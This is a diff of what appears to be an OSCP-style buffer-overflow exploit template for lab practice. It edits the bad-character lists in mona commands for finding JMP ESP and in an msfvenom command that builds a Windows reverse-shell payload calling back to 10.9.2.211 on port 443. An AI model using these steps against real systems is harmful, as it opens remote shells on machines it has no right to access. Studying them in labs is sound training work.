@@ -44,12 +44,11 @@ FIRST CREATE WOKRING DIRECTORY!!!
 """
 Possible: 23 24 3c 3d 83 84 ba
 
-!mona bytearray -b "\x00\x23\x3c"
-!mona compare -f C:\mona\oscp\bytearray.bin -a ESP_address
+!mona bytearray -b "\x00"
+!mona compare -f C:\mona\PROJECT_NAME\bytearray.bin -a ESP_address
 """
 # runner.sendBadChars(exclude = [
 #     "\x23",
-#     "\x3c",
 # ])
 
 
@@ -57,10 +56,10 @@ Possible: 23 24 3c 3d 83 84 ba
 # ----- 5. Send Exploit -----
 """
 Find JMP ESP
-!mona jmp -r esp -cpb "\x00\x23\x3c"
+!mona jmp -r esp -cpb "\x00"
 
 Generate payload
-msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.211 LPORT=443 EXITFUNC=thread -b "\x00\x23\x3c" -f c 
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.211 LPORT=443 EXITFUNC=thread -b "\x00" -f c 
 """
 
 # Set return address (in reverse)
